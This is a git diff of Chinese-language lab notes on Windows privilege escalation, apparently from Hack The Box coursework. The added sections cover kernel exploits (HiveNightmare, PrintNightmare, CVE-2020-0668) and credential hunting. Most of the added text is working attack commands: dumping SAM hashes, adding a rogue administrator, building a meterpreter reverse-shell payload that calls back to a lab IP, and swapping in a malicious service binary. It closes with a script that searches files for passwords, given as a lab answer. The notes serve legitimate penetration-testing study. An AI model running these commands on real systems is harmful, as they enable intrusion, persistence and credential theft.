@@ -870,7 +870,7 @@ C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\Sec
 C:\htb> sc start SecurityService
 ```
 
-## 方法二、弱服务权限
+### 方法二、弱服务权限
 
 1.1用sharpup再次审查
 
@@ -932,7 +932,7 @@ C:\htb> sc start WindScribeService
 C:\htb> sc query WindScribeService
 ```
 
-## 方法三、未带引号的服务路径
+### 方法三、未带引号的服务路径
 
 安装服务时，注册表配置指定应在服务启动时执行的二进制文件的路径。如果此二进制文件未封装在引号中，Windows 将尝试在不同的文件夹中查找该二进制文件。
 
@@ -944,7 +944,7 @@ C:\htb> sc query WindScribeService
 C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
 ```
 
-## 方法四、宽松的注册表ACL
+### 方法四、宽松的注册表ACL
 
 1.1检查注册表中的弱服务 ACL
 
@@ -963,3 +963,229 @@ PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelM
 ```powershell-session
 PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
 ```
+
+## 5.3 内核漏洞利用
+
+MS08-067
+
+MS17-010
+
+ALPC Task Scheduler 0-Day `ALPC 任务计划程序 0 天 `- Windows 任务计划程序服务使用的 ALPC 终结点方法可用于将任意 DACL 写入位于 `C：\Windows\tasks` 目录中的 `.job` 文件。攻击者可以利用它创建指向攻击者控制的文件的硬链接。此缺陷的漏洞利用使用 [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) API 函数使用 XPS 打印机调用打印作业，并通过后台处理程序服务将 DLL 劫持为 NT AUTHORITY\SYSTEM。深入的文章可在[此处](https://web.archive.org/web/20250303161707/https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html)获得。
+
+CVE-2021-36934 `CVE-2021-36934 HiveNightmare, aka SeriousSam` 是 Windows 10 的一个缺陷，导致任何用户都有权读取 Windows 注册表并访问敏感信息，而不管权限级别如何。研究人员迅速开发了一种 PoC 漏洞，允许读取 SAM、SYSTEM 和 SECURITY 注册表配置单元，并创建它们的副本以供以后离线处理，并使用 SecretsDump.py 等工具提取密码哈希值（包括本地管理员）。
+
+### 5.3.1值得注意的漏洞
+
+检查SAM文件的权限
+
+```cmd-session
+C:\htb> icacls c:\Windows\System32\config\SAM
+```
+
+执行攻击和解析密码哈希
+
+```powershell-session
+PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe
+```
+
+```shell-session
+[/htb]$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
+```
+
+检查后台处理程序服务
+
+```powershell-session
+PS C:\htb> ls \\localhost\pipe\spoolss
+```
+
+使用 PrintNightmare PowerShell PoC 添加本地管理员
+
+```powershell-session
+PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
+```
+
+```powershell-session
+PS C:\htb> Import-Module .\CVE-2021-1675.ps1
+PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
+```
+
+确认新管理员用户
+
+```powershell-session
+PS C:\htb> net user hacker
+```
+
+### 5.3.2枚举缺少的补丁
+
+检查已安装的更新
+
+```powershell-session
+PS C:\htb> systeminfo
+PS C:\htb> wmic qfe list brief
+PS C:\htb> Get-Hotfix
+```
+
+CVE-2020-0668利用：
+
+检查当前用户权限
+
+```cmd-session
+C:\htb> whoami /priv
+```
+
+```shell-session
+CVE-2020-0668.exe
+CVE-2020-0668.exe.config
+CVE-2020-0668.pdb
+NtApiDotNet.dll
+NtApiDotNet.xml
+```
+
+检查二进制文件的权限
+
+```cmd-session
+C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+
+生成恶意二进制文件
+
+```shell-session
+[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
+```
+
+托管恶意二进制文件
+
+```shell-session
+[/htb]$ $ python3 -m http.server 8080
+```
+
+下载恶意二进制文件
+
+```powershell-session
+PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
+PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
+```
+
+运行漏洞利用
+
+```cmd-session
+C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" 
+```
+
+检查新文件的权限
+
+```cmd-session
+C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
+```
+
+用恶意二进制文件替换文件
+
+```cmd-session
+C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+```
+
+Metasploit资源脚本，将以下命令保存到名为handler.rc的资源脚本文件中
+
+```shell-session
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <our_ip>
+set LPORT 8443
+exploit
+```
+
+使用资源脚本启动Metasploit
+
+```shell-session
+[/htb]$ sudo msfconsole -r handler.rc 
+```
+
+启动服务
+
+```cmd-session
+C:\htb> net start MozillaMaintenance 
+```
+
+## 5.4易受攻击的服务
+
+枚举已安装的程序
+
+```cmd-session
+C:\htb> wmic product get name
+```
+
+枚举本地端口
+
+```cmd-session
+C:\htb> netstat -ano | findstr 6064
+```
+
+枚举进程ID
+
+```powershell-session
+PS C:\htb> get-process -Id 3324
+```
+
+枚举正在运行的服务
+
+```powershell-session
+PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
+```
+
+## 5.5 DLL注入
+
+# 6、凭据盗窃
+
+## 6.1凭据搜寻
+
+应用程序配置文件
+
+```powershell-session
+PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+```
+
+字典文件
+
+```powershell-session
+PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+```
+
+powershell历史记录文件
+
+从 Windows 10 中的 Powershell 5.0 开始，PowerShell 将命令历史记录存储到文件：
+
+- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
+
+确认powershell历史记录保存路径
+
+```powershell-session
+PS C:\htb> (Get-PSReadLineOption).HistorySavePath
+```
+
+读取poweshell历史记录文件
+
+```powershell-session
+PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
+```
+
+```powershell-session
+PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\C
+onsoleHost_history.txt" -ErrorAction SilentlyContinue}
+```
+
+解密Powershell凭据
+
+```powershell-session
+PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
+PS C:\htb> $credential.GetNetworkCredential().username
+```
+
+本节实验答案：
+
+```powershell
+Set-Location C:\Users
+Get-ChildItem -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml -ErrorAction SilentlyContinue |
+  Select-String -Pattern '(?i)(password|passwd|pwd|secret|token)' |
+  ForEach-Object { "$($_.Path):$($_.LineNumber): $($_.Line.Trim())" }
+```
+
